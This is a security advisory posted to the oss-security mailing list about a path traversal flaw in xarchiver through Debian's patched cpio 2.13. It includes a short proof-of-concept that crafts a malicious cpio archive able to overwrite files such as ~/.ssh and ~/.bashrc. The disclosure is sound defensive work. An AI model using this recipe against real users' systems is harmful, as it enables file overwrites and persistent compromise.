Received: (qmail 13506 invoked by uid 550); 27 Dec 2023 13:42:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3412 invoked from network); 27 Dec 2023 11:49:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oddnet.de; s=DKIM001;
	t=1703677794;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding;
	bh=nKOwSofCXP3rEZtA8pDZJ5MGa8g6zEiOOVQkxvbmoBU=;
	b=FhGPD91l296TMX6zby8o0LaVIfZtxFLzSr+sl3LC/rj86Px1Qyja4HAw4fVY8wuWNPI86C
	fGCf5McBeSvjktMUYpexaUfFyMkgsa5nnEN+jliPcZdKBp3I5Vd/NJRBn90AP3LTP/bqkL
	K5H2kHIIF0SpWUDLxI8hgrtSDeGdZwxHNgPj+qEuPa6fABDrsKPDw1YZdwDdKGYyOMwl+S
	dd9dpkGVqM+msT/6KBgWZ7kIGlCnt9qobn5pEgKZ4Gn7iMuV/yMIEFYNgWvef41x1aQfAY
	ysxx/PgEkoRYo7o9gpFZDOlKSfLiOFe3YO8c21vR76baTZzSxvMGuBjo9Y0YLw==
Message-ID: <658c0eaf.45f2b459.bm000@oddnet.de>
From: =?ISO-8859-1?Q?Ingo=20Br=FCckl?= <ib@oddnet.de>
To: oss-security@lists.openwall.com
Date: Wed, 27 Dec 2023 12:46:54 +0100
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=ISO-8859-1
X-Mailer: blueMail/Linux 1.5
Cc: Markus Koschany <apo@debian.org>
Subject: [oss-security] xarchiver: Path traversal with crafted cpio archives

Hi,

I was alerted by febinrev on GitHub to a vulnerability in xarchiver that
stems from a vulnerability in cpio, which is called by xarchiver to extract
cpio and rpm archives.

It is a path traversal vulnerability with maliciously crafted cpio archives
that affects all cpio versions up to and including 2.12 (see CVE-2015-1197).
The vulnerability has been fixed in cpio 2.13.

However, due to two bug reports (#946267 and #946469), Debian has patched
cpio 2.13 which re-enables the path traversal vulnerability, thus affecting
all distributions that use Debian cpio 2.13 directly or have applied their
"revert-CVE-2015-1197-handling" patch. Debian has been informed and is
working on a security fix.

Instructions from febinrev to craft a cpio archive to demonstrate the
vulnerability:

  mkdir test_cpio
  ln -sf /tmp/ test_cpio/tmp
  echo "TEST Traversal" > test_cpio/tmpYtrav.txt
  cd test_cpio/
  ls | cpio -ov > ../trav.cpio
  cd ../
  sed -i s/"tmpY"/"tmp\/"/g trav.cpio

Even

  cpio -id --no-absolute-filenames -I trav.cpio

doesn't prevent path traversal with affected cpio versions, and such an
archive can be further obfuscated with file extensions such as .rar or
.tar.gz.

Malicious cpio archives that exploit this vulnerability can overwrite files
in locations such as ~/.ssh, ~/.bashrc, ~/.config/autostart/, etc.

In addition to xarchiver, all other GUI front-ends for archive management
that call cpio as a command-line program are most likely also affected!

Ingo
















